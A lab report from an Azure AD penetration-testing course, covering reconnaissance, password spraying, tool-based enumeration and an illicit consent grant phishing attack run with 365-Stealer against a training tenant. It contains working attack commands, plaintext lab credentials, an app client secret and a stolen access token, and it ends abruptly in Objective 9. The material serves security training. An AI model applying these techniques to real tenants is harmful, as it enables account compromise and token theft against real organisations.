# Azure AD Pentest - Lab Report

- [Azure AD Pentest - Lab Report](#azure-ad-pentest---lab-report)
  - [Objective 1: Basic Recon](#objective-1-basic-recon)
    - [Is the organization using Azure AD?](#is-the-organization-using-azure-ad)
    - [ID of Tenant](#id-of-tenant)
    - [Validate email IDs](#validate-email-ids)
    - [Azure Services used by the organization](#azure-services-used-by-the-organization)
  - [Objective 2: Initial Access](#objective-2-initial-access)
    - [Questions](#questions)
    - [Brute force](#brute-force)
    - [Enumerate Users / Groups / Devices / Directory Roles / Enterprise Applications on Azure Portal](#enumerate-users--groups--devices--directory-roles--enterprise-applications-on-azure-portal)
  - [Objective 3: Authenticated Enumerations using AzureAD Module](#objective-3-authenticated-enumerations-using-azuread-module)
    - [Users](#users)
    - [Groups](#groups)
    - [Devices](#devices)
    - [Directory Role Global Administrator](#directory-role-global-administrator)
    - [All custom directory roles (Azure Preview)](#all-custom-directory-roles-azure-preview)
    - [Enterprise Applications](#enterprise-applications)
  - [Objective 4: Authenticated Enumeration using Az PowerShell](#objective-4-authenticated-enumeration-using-az-powershell)
    - [All resources visible to the user](#all-resources-visible-to-the-user)
    - [All Azure roles assigned to the user](#all-azure-roles-assigned-to-the-user)
    - [Virtual Machines](#virtual-machines)
    - [App Services](#app-services)
    - [Function Apps](#function-apps)
    - [Storage Accounts](#storage-accounts)
    - [Key Vaults](#key-vaults)
  - [Objective 5: Authenticated Enumeration using Azure CLI](#objective-5-authenticated-enumeration-using-azure-cli)
    - [Virtual Machines](#virtual-machines-1)
    - [App Services](#app-services-1)
    - [Function Apps](#function-apps-1)
    - [Storage Accounts](#storage-accounts-1)
    - [Key Vaults](#key-vaults-1)
  - [Objective 6: Authenticated Enumeration - ROADTool](#objective-6-authenticated-enumeration---roadtool)
  - [Objective 7: Authenticated Enumeration - StormSpotter](#objective-7-authenticated-enumeration---stormspotter)
  - [Objective 8: Authenticated Enumeration - BloodHound](#objective-8-authenticated-enumeration---bloodhound)
  - [Objective 9: Authenticated Enumeration and Initial Access](#objective-9-authenticated-enumeration-and-initial-access)
    - [Setup Malicious Azure App](#setup-malicious-azure-app)
    - [Setup 365-Stealer](#setup-365-stealer)
    - [Get & Send the phishing link](#get--send-the-phishing-link)
    - [Getting the access tokens of the victim](#getting-the-access-tokens-of-the-victim)
    - [Get admin consent](#get-admin-consent)
    - [Weaponized Word file to reverse shell](#weaponized-word-file-to-reverse-shell)
  - [Objective 10: App Service Abuse - Insecured File Upload](#objective-10-app-service-abuse---insecured-file-upload)
    - [Abuse the file upload vulnerability](#abuse-the-file-upload-vulnerability)
  - [Objective 11: App Service Abuse - Server-side Template Injection](#objective-11-app-service-abuse---server-side-template-injection)
  - [Objective 12:  App Service Abuse - Insecured File Upload, OS Command Injection](#objective-12--app-service-abuse---insecured-file-upload-os-command-injection)
  - [Objective 13:  App Service Abuse - Storage Blobs](#objective-13--app-service-abuse---storage-blobs)
  - [Objective 14: Automation account](#objective-14-automation-account)
  - [Objective 15: App Service Abuse - Azure VM](#objective-15-app-service-abuse---azure-vm)
  - [Objective 16: Key Vault](#objective-16-key-vault)
  - [Objective 17: Phishing using Evilginx2](#objective-17-phishing-using-evilginx2)
    - [Setting up Evilginx2](#setting-up-evilginx2)
    - [Setup DNS](#setup-dns)
    - [Send the lure](#send-the-lure)
  - [Objective 18: Enterprise Applications & ARM templates](#objective-18-enterprise-applications--arm-templates)
  - [Objective 19: Abuse Function app with GitHub CD](#objective-19-abuse-function-app-with-github-cd)
  - [Objective 20: Lateral Movement, AD joined machine & Pass-the-certificate](#objective-20-lateral-movement-ad-joined-machine--pass-the-certificate)
  - [Objective 21: PRT & Intune](#objective-21-prt--intune)

---

## Objective 1: Basic Recon

**Questions**

Gather the following information about the defcorphq organization:

- Is the organization using Azure AD? 
- ID of Tenant  
- Validate email IDs  
- Azure Services used by the organization

<br/>

**Answers**

### Is the organization using Azure AD?

To verify if the organization is using Azure AD, we can try to see if an Azure Tenant related to the company exists using the keyword `defcorphq`:

```
https://login.microsoftonline.com/getuserrealm.srf?login=root@defcorphq.onmicrosoft.com&xml=1
```

![picture 8](images/6f16946dc9aa1b7d764b965f76b96c8d40e79d972d2a4abd1151025be406cfe0.png)  

This confirms that the organization is in fact using Azure AD.

<br/>

We can also use AADInternals tool to enumerate:

```
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntLoginInformation -UserName root@defcorphq.onmicrosoft.com
```

![picture 10](images/364e00f7c08cd9f835709b5c36ff4a00a6575fba38eeab49c61353f1d3478b67.png)  


<br/>

### ID of Tenant

To obtain the ID of the Tenant:

```
https://login.microsoftonline.com/defcorphq.onmicrosoft.com/.well-known/openid-configuration
```

![picture 9](images/ff229051a258e8547450a1e68c96ada916da30a271f3fbace94506dced24788f.png)  

The tenant ID is `2d50cb29-5f7b-48a4-87ce-fe75a941adb6`

<br/>

We can also use AADInternals tool:

```
Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
Get-AADIntTenantID -Domain defcorphq.onmicrosoft.com
```

![picture 11](images/22422075411b72570d3d03897981bee591dd9916ed6e3a3a4612d9881e71dd94.png)  


<br/>

### Validate email IDs

To enumerate valid email IDs, first we need a list of emails. For example:

![picture 12](images/00810d667085c8996d5f61c16adfa103e7da627bfdf5ff1e193e3b3153856dd0.png)  

Then we can use **o365creeper** to check if they are valid:

```
C:\Python27\python.exe C:\AzAD\Tools\o365creeper\o365creeper.py -f C:\AzAD\Tools\emails.txt -o C:\AzAD\Tools\validemails.txt
```

![picture 13](images/452592e87c17ec2edd6a4e5d9ad3f0473305a41a54341798ba8470b19b735a4b.png)  

<br/>

### Azure Services used by the organization

To enumerate Azure Services used by the organization, we can use **MicroBurst**:

```
Import-Module C:\AzAD\Tools\MicroBurst\MicroBurst.psm1 -Verbose
Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

![picture 15](images/cd7fe38ac88b9e8039379188cd898195a3d8c6740dca16d0f559e179a74fac1f.png)  

- Email (defcorphq.mail.protection.outlook.com)
- Microsoft Hosted Domain (defcorphq.onmicrosoft.com)
- SharePoint (defcorphq.sharepoint.com / defcorphq-my.sharepoint.com)

<br/>

---

## Objective 2: Initial Access

### Questions

- Brute-force one of the users that we enumerated from the defcorphq tenant.
- Enumerate the following for the defcorphq tenant using Azure Portal: 
  - Users
  - Groups
  - Devices
  - Directory Roles
  - Enterprise Applications

<br/>

### Brute force

With a valid email list obtained in Objective 1, we can use `MSOLSpray` to perform a password spray:

```
. C:\AzAD\Tools\MSOLSpray\MSOLSPray.ps1

Invoke-MSOLSpray -UserList C:\AzAD\Tools\validemails.txt -Password SuperVeryEasytoGuessPassword@1234 -Verbose
```

![picture 16](images/b61c3977af8c1c6babc4a0a82d94f05ab9f6a99a518a481c6e97fb03c039b905.png)  

As shown, we can access the Azure with the following credential:

- `test@defcorphq.onmicrosoft.com` / `SuperVeryEasytoGuessPassword@1234`

<br/>

### Enumerate Users / Groups / Devices / Directory Roles / Enterprise Applications on Azure Portal

First login with the found credentials:

- https://portal.azure.com

![picture 17](images/53636cf52d52e824c4cb86337aa5efee320ad88168dd1f651bfc14e9ead31da3.png)  

<br/>

To view users:

![picture 18](images/c963b6a64f7363b679249ce7075c415b9f0b59707eff3015ba1ad59983765175.png)  

![picture 19](images/b23325d8901224a8eeeff6def092453157a6d3a53915247cced5408a4e6a9471.png)  

<br/>

To view groups:

![picture 20](images/1ce3dbb45679d942cd2717ef9751676f6b94c004cce2bf565ad9e0494d221e16.png)  

![picture 21](images/2c4ab38e6fdcace6bbbbf39824b4472c26a35060b4a7d9f30e627e01a207997c.png)  

<br/>

To view Devices:

![picture 22](images/fd52410d1e2136936f1d332afbb3f028cd4de8b25f5bd6c4be240bab65d45c29.png)  

![picture 23](images/5e9272dfd466a43ccfc3bcf3dab8a73cbc6d2e292fcda0da70f951a9ba4fdd1c.png)  

<br/>

To view directory roles:

![picture 24](images/05f26e8788cff4ff437a8069779579ead4ad3422369620ba34c3c97df60ece52.png)  

![picture 25](images/07dcc7c7fd98f4aa14dd4bb453bc2958bae936370fe87f89ebf79109e502c832.png)  

<br/>

To view enterprise applications:

![picture 26](images/0fcca73fb76dd72c5d9ca2a18c78b3d859265571653a843609675928cfa20af9.png)  

![picture 27](images/a4c3375179ace4602b19318467f1a59065be3e7e3d8a139d49be31062c1db12f.png)  

<br/>

---

## Objective 3: Authenticated Enumerations using AzureAD Module

Enumerate the following for the defcorphq tenant using AzureAD PowerShell module

- Users
- Groups
- Devices
- Directory Role Global Administrator
- All custom directory roles (Azure Preview)
- Enterprise Applications

<br/>

### Users

First import AzureAD module:

```
Import-Module C:\AzAD\Tools\AzureAD\AzureAD.psd1; $passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force ; $creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd) ; Connect-AzureAD -Credential $creds
```

![picture 67](images/d4a1b4ec0b3b841948169afc31abe62109a225e81f15dfd577a4c4121c92bf4b.png)  


<br/>

To enumerate users:

```
Get-AzureADUser -All $true
```

![picture 68](images/c706a7fcd2bb2e0971416daf0124910d21201015d55bc8df66dfc0e1fb9f5521.png)  

<br/>

### Groups

To enuemrate Groups:

```
Get-AzureADGroup -All $true
```

![picture 69](images/a1e4f3079118d415aa0fe73d5fab159f3c5b89af31b507e24fc2dec06cb9dd3a.png)  

<br/>

### Devices

To enumerate Devices:

```
Get-AzureADDevice -All $true
```

![picture 70](images/fccefa100e940fd48287b1a0d08e9e3a9c3af8e846316cc87205b7880056a856.png)  

<br/>

### Directory Role Global Administrator

To enumerate users with Global Administrator role:

```
Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
```

![picture 71](images/30ebed333edde5fa2be3f13c1c67c5d722beb82c8d6b7d0ddf9086e75e7fa880.png)  

<br/>

### All custom directory roles (Azure Preview)

To list custom roles, **AzureADPreview** module can be used:

```
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1; $passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd); Connect-AzureAD -Credential $creds

Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
```

![picture 74](images/e8d53ff46e004736d6fe77cd764b8697832ef94424d282aaf93aa14faf93325a.png)  

<br/>

### Enterprise Applications

To enuemrate enterprise applications (Note this is **Service Principal but not App!**):

```
Get-AzureADServicePrincipal -All $true
```

![picture 76](images/3477d29709b4d739c9e94bb81c272547d2cdeea2736c2cd56600960539cd269e.png)  


<br/>

---

## Objective 4: Authenticated Enumeration using Az PowerShell

**Question**

Enumerate the following for the defcorphq tenant using Az PowerShell module using the credentials of `test@defcorphq.onmicrosoft.com` user:
- All resources visible to the user 
- All Azure roles assigned to the user 
- Virtual Machines 
- App Services 
- Function Apps 
- Storage Accounts
- Key Vaults

<br/>

**Answer**

### All resources visible to the user 

First authenticate with Azure:

```
$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd); Connect-AzAccount -Credential $creds
```

![picture 91](images/d20978857baf52cc65f27e34024c04357326673a467d171ce1354a47bd03bf80.png)  

<br/>

To enumerate all resources visible to the current user:

```
Get-AzResource | Select Name, ResourceGroupName, ResourceType
```

![picture 92](images/d4f92f4f66f30de1a78b2df24f6650bd2cd0f07c25c330a9008409e555bda8a9.png)  

<br/>

### All Azure roles assigned to the user

To enuemrate the roles assigned to the current user:

```
Get-AzRoleAssignment -SignInName test@defcorphq.onmicrosoft.com | ft DisplayName, RoleDefinitionName, ObjectType, CanDelegate
```

![picture 93](images/4e27b44f0ca173c21594f303c1630bf9312a7e5e24f17422ef2378c4b935c3a3.png)  

<br/>

### Virtual Machines

To enuemrate VM where the current user has at least READ access:

```
Get-AzVM | fl *
```

![picture 94](images/fb92df6043f476403cc91f46b609b2b513fa499682bbcd18330f50d76f4cda8b.png)  

<br/>

### App Services 

Note that **App Services** refers to **web hosting service**.

```
Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"} | ft Name, HostNames, DefaultHostName, Kind, Type
```

![picture 95](images/a032f24f23146ae38053ed78fd059b6578e339d75b4a842519dc82381323ba04.png)  

<br/>

### Function Apps

To enuemerate Function Apps:

```
Get-AzFunctionApp | ft Name, HostNames, DefaultHostName, Kind, Type
```

![picture 96](images/813ca7efe92ff3c6e8d73dcd5627aaf0f0b8b1358e6bf6e87430527caa12730b.png)  

<br/>

### Storage Accounts

To enuemrate storage accounts:

```
Get-AzStorageAccount | fl *
```

![picture 97](images/ed6c5ac314b1293ed0be2d49f96dc16e837a56f62078e0984fa77f3ea25af54e.png)  

<br/>

### Key Vaults

To enumerate key vaults:

```
Get-AzKeyVault | fl *
```

![picture 98](images/ee56a267f1d9ac65e5eb436590ca1abdc46a9b5ca060bcf9120115dc9ff55496.png)  

<br/>

---

## Objective 5: Authenticated Enumeration using Azure CLI

**Questions**

Enumerate the following for the defcorphq tenant using az cli using the credentials of `test@defcorphq.onmicrosoft.com` user:

- Virtual Machines
- App Services
- Function Apps
- Storage Accounts
- Key Vaults

<br/>

**Answers**

### Virtual Machines

First authenticate with the compromised credential:

```
az login -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234 --allow-no-subscriptions
```

![picture 128](images/bd15f073e572e652c544392f1955c6ed12bd6c589d9f09317749f61a6e9e74f6.png)  


<br/>

To list all VMs:

```
az vm list --query "[].name"
```

![picture 129](images/668a3573ef11581744c251df34715421c3198beeb098f33867c54043cbe6f19b.png)  

<br/>

### App Services

To list app services (webapp):

```
az webapp list --query "[].hostNames"
```

![picture 130](images/7aecd518602bf9db22d872efb2560f0e6aec448d44beed8dad513b291895648f.png)  

<br/>

### Function Apps

```
az functionapp list --query "[].hostNames"
```

![picture 131](images/9532c2f068a895194a3faa3a59209d96ef8ab172180203e15c6ee658083c7f36.png)  

<br/>

### Storage Accounts

```
az storage account list
```

### Key Vaults

```
az key vault list
```

<br/>

---

## Objective 6: Authenticated Enumeration - ROADTool

**Questions**

Enumerate the following for the defcorphq tenant using ROADTools with the credentials of test@defcorphq.onmicrosoft.com user:

1. Check if the 'Operations' Group is allowed to use Finance Management System app
2. Permissions that AdminAppSimulation has for Mark D Walden

<br/>

**Answer**

First use ROADTools to authenticate with Azure AD:

```
cd C:\AzAD\Tools\ROADTools; pipenv shell; 

roadrecon auth -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234
```

![picture 1](images/f75a3aa8e37f5a75a2fd1597424ea00c521d503fcd3bcf05a7842ec882fba598.png)  

<br/>

Then gather information:

```
roadrecon gather
```

![picture 2](images/e5f413d447f190d88a5bc42a70319f5130342b16fbe7752f407c4df5365d6b64.png)  


<br/>

Run ROADTools GUI:

```
roadrecon gui
```

![picture 3](images/3a7a1554c7d98fa68e150b720a2913a91f64993bbfdd3eb62b60a29196fd44c7.png)  


<br/>

![picture 4](images/8ca52a474e95b7d883f4c46a11696ecbe09866ada5cc698caf9b3fcaa2ce3101.png)  

<br/>

Navigate to `Applications roles` and filter out `Operations`, it is found that `Operations` has access to the application `Finance Mangement System`:

![picture 5](images/7396268e7b90e9487f9eb76696b18b7f64d7959b5343e1c248f04ddda0381a8a.png)  

<br/>

To check the permissions that AdminAppSimulation has for Mark D Walden, navigate to `OAuth2 Permissions` and filter out `AdminAppSimulation`:

![picture 6](images/ae374927b39bcbf42cd1485f5a3c7cbb86f45ab70d8608f9ff05f8720fe83921.png)  

<br/>

---

## Objective 7: Authenticated Enumeration - StormSpotter

**Question**

Enumerate the following for the defcorphq tenant using StormSpotter with the credentials of test@defcorphq.onmicrosoft.com user:
- Show All RBAC Relationships

<br/>

**Answer**

First start the backend service:

```
cd C:\AzAD\Tools\stormspotter\backend\; pipenv shell 

python ssbackend.pyz
```

![picture 7](images/54f0d83e8c68b6615e25756a242d2ef3d09daf7057c98e7a669f1319f706c1f6.png)  

<br/>

In a new shell, start the frontend webserver:

```
cd C:\AzAD\Tools\stormspotter\frontend\dist\spa\; quasar.cmd serve -p 9091 --history
```

![picture 8](images/086f7377c5b766afd7a5859e200fdd8df3e32389f61b0cf3de90defe7b1deb8a.png)  

<br/>

Use Stormcollector to collect the data:

```
cd C:\AzAD\Tools\stormspotter\stormcollector\; pipenv shell

az login -u test@defcorphq.onmicrosoft.com -p SuperVeryEasytoGuessPassword@1234; python C:\AzAD\Tools\stormspotter\stormcollector\sscollector.pyz cli
```

![picture 9](images/073adf74cfcef0e01a29ecc45137746d36527c94303953dfb88ac9a231506e2b.png)  

<br/>

Then browse http://localhost:9091 and user the credential `neo4j` / `BloodHound`:

![picture 10](images/b8a148c0b75005449063542630037eac863ea7eeef877498b6d9f57499a5cd05.png)  

<br/>

Upload the collected data:

![picture 11](images/8a312e0f108657f2a4ec0702987ce2da86c94c8e927849cd4c5997615b86a80d.png)  

<br/>

Use the query `Show all RBAC Relationships`:

![picture 12](images/76b6a65f037cc988c36131c412a512dcf846df3c7fb5a745624ec524601de9e2.png)  

<br/>

---

## Objective 8: Authenticated Enumeration - BloodHound

**Question**

Enumerate the following for the defcorphq tenant using BloodHound with the credentials of test@defcorphq.onmicrosoft.com user:

- All users with the Global Administrator role
- All paths to an Azure Key vault

<br/>

**Answer**

First run the collector to gather data:

```
$passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential("test@defcorphq.onmicrosoft.com", $passwd)

Connect-AzAccount -Credential $creds
Connect-AzureAD -Credential $creds

. C:\AzAD\Tools\AzureHound\AzureHound.ps1
Invoke-AzureHound -Verbose
```

![picture 13](images/f977dddf79bf20670e0fa4f116416850407bb0956a9ffc0aa7bce25d5ed3390f.png)  

<br/>

Then launch BloodHound and use the credential `neo4j` / `BloodHound` to login:

![picture 14](images/bee82fe7bd2b878ff78e0de0f23371a93b505948255d8e36ca49158ebba35b55.png)  

<br/>

Upload the collected data:

![picture 15](images/3f6fe2f389916b8b8db697b1031be9641893f88bb7fddb18aa61231511a0633a.png)  

<br/>

To get all users with the Global Administrator role, use the following query at the bottom field **Raw Query**:

```
MATCH p =(n)-[r:AZGlobalAdmin*1..]->(m) RETURN p
```

![picture 16](images/a3e03621f3693d5394160e99bb6396dcfaa7327e95fc6f35aeb2240d07f7e235.png)  

![picture 17](images/f473ad8848a22c7d1f1c073f3bfd749f7a14630a093746b3a81a3177ef0d2c9c.png)  

![picture 18](images/66412f46ec791a6a14d38035862cb7204c25d8c38d7ea668dcf9e4bf5ad348b9.png)  

<br/>

Users with the Global Administrator role:

- ADMIN@DEFCORPHQ.ONMICROSOFT.COM
- MONIKA_ALTEREDSECURITY.COM#EXT#_MONIKAALTEREDSECURITY.FGYWB#EXT#@DEFCORPHQ.ONMICROSOFT.COM

<br/>

To get all paths to an Azure key vault:

```
MATCH p = (n)-[r]->(g:AZKeyVault) RETURN p
```

<br/>

---

## Objective 9: Authenticated Enumeration and Initial Access

**Question**

Compromise an application administrator and their workstation in defcorphq tenant using the **Illicit Consent Grant attack**.

**Answser**

### Setup Malicious Azure App

First use the attacker's infrastructure to register an application.

- student190@defcorpextcontractors.onmicrosoft.com

Go to **AAD > App Registration > New Registration**:

![picture 1](images/347af324f5dd65f16d4e56ffbbe160f2ca637e5d7b802440ab2b07a4d45e13b7.png)  

- **Name**: student190-app
- **Supported account types:**  Accounts in any organizational directory (Any Azure AD directory - Multitenant)
- **Redirect URI:** (Web) https://172.16.152.190/login/authorized

<br/>

Then you will be redirected to the Overview page. Note the Application ID:

![picture 4](images/d978d43b6bb3ce114f7b78ab8e52034dee88d7a7a5cf1d7dad1fa95e7bc030c1.png)  

- **Application ID:**  `2ec2f07e-5a83-4110-8859-d4d5a14bad2e`

<br/>

Then go to **Certificates & secrets > New client secret**:

![picture 2](images/f506ceeda558a46cf02eb2802ea33f29dc6260d8720144f9f1c31bd1eadf7581.png)  

- **Description:**  student190-secret

Save the secret somewhere:

![picture 3](images/08cfd6fe528bf850435c2f3aea8e1b600dc6199a7ac4b7c2a4b88f467a43c36c.png)  

- **Secret ID:**  `72cf98cf-0a9e-4758-adc2-f51144f45eed`
- **Secret Value:**  `_-l5-M386zc-gRo_4_9czdyJ_NVXic1DrO`

<br/>

Then go to **API permissions** and add the following Delegated permissions:

- `User.Read`
- `User.ReadBasic.All`

![picture 5](images/15d61dd30de4d798238012340bab5feb361b91984dfb0d91623f22c0f41bd526.png)  

<br/>

Then use the **AzureADPreview** module to see if the users (compromised accounts) are allowed to consent to apps. If true, we will get a response of `ManagePermissionGrantsForSelf.microsoft-user-default-legacy`:

```
Import-Module C:\AzAD\Tools\AzureADPreview\AzureADPreview.psd1; $passwd = ConvertTo-SecureString "SuperVeryEasytoGuessPassword@1234" -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential ("test@defcorphq.onmicrosoft.com", $passwd); Connect-AzureAD -Credential $creds; (Get-AzureADMSAuthorizationPolicy).PermissionGrantPolicyIdsAssignedToDefaultUserRole
```

![picture 6](images/cb3b1266c731ed2f1ba6b4656285fe5a6dae9ca6f69287643ca5e50ca3582ba1.png)  

<br/>

### Setup 365-Stealer

First run (as admin) xampp control panel and start Apache.

![picture 7](images/476ddfd88a8ee640d7e26a2298f0814c12145580fd37b110ab4fcaea42143800.png)  

<br/>

Copy the 365-Stealer directory from `C:\AzAD\Tools` to `C:\xampp\htdocs`. Edit `365-stealer.py` in `C:\xampp\htdocs\365-Stealer` and change:

| **Parameter** | **Value** |
| --- | --- |
| `CLIENTID` | `2ec2f07e-5a83-4110-8859-d4d5a14bad2e` |
| `REDIRECTURL` | `https://172.16.152.190/login/authorized` |
| `CLIENTSECRET` |  `_-l5-M386zc-gRo_4_9czdyJ_NVXic1DrO` |

![picture 8](images/50c20caec60190dd7d8b8f87d1344d757b54d1be5255344f293aa03f71787e15.png)  

<br/>

Then start 365-stealer:

```
cd C:\xampp\htdocs\365-Stealer; &"C:\Program Files\Python38\python.exe" C:\xampp\htdocs\365-Stealer\365-Stealer.py --run-app
```

![picture 9](images/607b3732bdd0f0dca80aaa9b88aebf152f920763c4897f8f2909356c9c134e7b.png)  

<br/>

### Get & Send the phishing link

Go to https://localhost and click on `Read More`. Then copy the URL:

![picture 10](images/f21538a8694bcda9a6137f05b18deefe6b21525d563bb2b0c78f765259afb2f6.png)  

- `https://login.microsoftonline.com/common/oauth2/authorize?response_type=code&client_id=2ec2f07e-5a83-4110-8859-d4d5a14bad2e&scope=https%3A%2F%2Fgraph.microsoft.com%2F.default+openid+offline_access+&redirect_uri=https%3A%2F%2F172.16.152.190%2Flogin%2Fauthorized&response_mode=query&sso_reload=true`

<br/>

Then we have to think of how to get the victim to click on the link.

One of the ways is to use `MicroBurst` to find an application that allows us to contact users in the target organization. (Note: It takes time to do this ...)

```
. C:\AzAD\Tools\MicroBurst\Misc\Invoke-EnumerateAzureSubDomains.ps1; Invoke-EnumerateAzureSubDomains -Base defcorphq -Verbose
```

- In this case `defcorphqcareer.azurewebsites.net` is found.

![picture 11](images/e46ec6273a6fccffac9d229bfd51696a349729440cab3d1adfd17e1b71c6564c.png)  

https://defcorphqcareer.azurewebsites.net/help.php allows us to send a message and link:

![picture 12](images/3c59cf398231fa5fdfdcba7da15ab27e3835d9e26b507b5d73da0c2b2440be31.png)  

<br/>

Use the phishing link in the form:

![picture 13](images/bcf6d51d56ae18284e2fabd3f36ea195cfa4b6d7bb476e822e0693a7687a3603.png)  

<br/>

### Getting the access tokens of the victim

After a while, the victim `ErikMKeller@defcorphq.onmicrosoft.com` checks the phishing link:

![picture 14](images/f419825716107cade8799610fa39465de5f1e10f9cfe113953928c95cbf094b7.png)  

Browse http://localhost:82/365-Stealer/yourVictims/?dir=ErikMKeller%40defcorphq.onmicrosoft.com:

![picture 15](images/c876a29c2db1d27b810ba6cc4f8f92606bccf2979ab4fb666b5b55fd3e2993d3.png)  

The access token:

```
eyJ0eXAiOiJKV1QiLCJub25jZSI6Im1hNlBrQkZIblNSQkFfRmZlTGJ1TFF6VUVkWGVzeGpIWUpibUozSlpwN1UiLCJhbGciOiJSUzI1NiIsIng1dCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyIsImtpZCI6Im5PbzNaRHJPRFhFSzFqS1doWHNsSFJfS1hFZyJ9.eyJhdWQiOiJodHRwczovL2dyYXBoLm1pY3Jvc29mdC5jb20vIiwiaXNzIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvMmQ1MGNiMjktNWY3Yi00OGE0LTg3Y2UtZmU3NWE5NDFhZGI2LyIsImlhdCI6MTYxOTg3MjI2NiwibmJmIjoxNjE5ODcyMjY2LCJleHAiOjE2MTk4NzYxNjYsImFjY3QiOjAsImFjciI6IjEiLCJhY3JzIjpbInVybjp1c2VyOnJlZ2lzdGVyc2VjdXJpdHlpbmZvIiwidXJuOm1pY3Jvc29mdDpyZXExIiwidXJuOm1pY3Jvc29mdDpyZXEyIiwidXJuOm1pY3Jvc29mdDpyZXEzIiwiYzEiLCJjMiIsImMzIiwiYzQiLCJjNSIsImM2IiwiYzciLCJjOCIsImM5IiwiYzEwIiwiYzExIiwiYzEyIiwiYzEzIiwiYzE0IiwiYzE1IiwiYzE2IiwiYzE3IiwiYzE4IiwiYzE5IiwiYzIwIiwiYzIxIiwiYzIyIiwiYzIzIiwiYzI0IiwiYzI1Il0sImFpbyI6IkFTUUEyLzhUQUFBQWNDR0hIYWt5dVZlVHhnUDNnRklXdzZhM3MydVdUUHlGSUpVZjRNdVg0TVk9IiwiYW1yIjpbInB3ZCJdLCJhcHBfZGlzcGxheW5hbWUiOiJzdHVkZW50MTkwLWFwcCIsImFwcGlkIjoiMmVjMmYwN2UtNWE4My00MTEwLTg4NTktZDRkNWExNGJhZDJlIiwiYXBwaWRhY3IiOiIxIiwiaWR0eXAiOiJ1c2VyIiwiaXBhZGRyIjoiNTEuMjEwLjEuMjM5IiwibmFtZSI6IkVyaWsgTS4gS2VsbGVyIiwib2lkIjoiNGQxZDk5M2ItNmY1MC00ZDViLWFkODgtYWM0YzI2MjQzYTY2IiwicGxhdGYiOiIzIiwicHVpZCI6IjEwMDMyMDAxMjBENkZGODYiLCJyaCI6IjAuQVhBQUtjdFFMWHRmcEVpSHp2NTFxVUd0dG43d3dpNkRXaEJCaUZuVTFhRkxyUzV3QUs0LiIsInNjcCI6IlVzZXIuUmVhZCBVc2VyLlJlYWRCYXNpYy5BbGwiLCJzaWduaW5fc3RhdGUiOlsiaW5rbm93bm50d2siXSwic3ViIjoiUk81UTFUMXh0ejFyYlZNMEFuNG5hcjZIWXd3VUV3eEM5QnlIdmJfNnJ0MCIsInRlbmFudF9yZWdpb25fc2NvcGUiOiJBUyIsInRpZCI6IjJkNTBjYjI5LTVmN2ItNDhhNC04N2NlLWZlNzVhOTQxYWRiNiIsInVuaXF1ZV9uYW1lIjoiRXJpa01LZWxsZXJAZGVmY29ycGhxLm9ubWljcm9zb2Z0LmNvbSIsInVwbiI6IkVyaWtNS2VsbGVyQGRlZmNvcnBocS5vbm1pY3Jvc29mdC5jb20iLCJ1dGkiOiJPX0ctWDZkOEVVaVFCOHh0R2dwVUFnIiwidmVyIjoiMS4wIiwid2lkcyI6WyJiNzlmYmY0ZC0zZWY5LTQ2ODktODE0My03NmIxOTRlODU1MDkiXSwieG1zX3RjZHQiOjE2MTUzNzU2Mjl9.JExDfzGEVDBilHfR9hVa1_2THrBk28yRj68uXEhlRpUtixCgO1VFR9h_0A_IlV0xfYkStkk4BzLuJbNkqrePfxhlYHDv5N9QsA9xdpiK5GyKUBUFNTlRnm5fe24CIIR9MPBsOz16RXe2qHf_YKOBw9pDge2MwBLzdJu8J4ZZ_r7L3VIpg3-fPA5yD3PA_3nY3RmXS9yTn_CHCCcezBCTQz1vI7TUc-998xvVDOMcmOqwM4pSfVU7UDC6eTfgvWaAr7q-1ekGWFBhoLB2HJ24ntw-Jf45AGYlcDCs2QXcjK43uK4GXCP9mFuyLA03XpCeTuIS3WOo39tjcRAjYQpY_g 
```

<br/>

Remember our app has the consent to `User.Read` and `User.ReadBasic.All` permissions. Try to enumerate all users (this gives us a list of targets in the target organization).

```
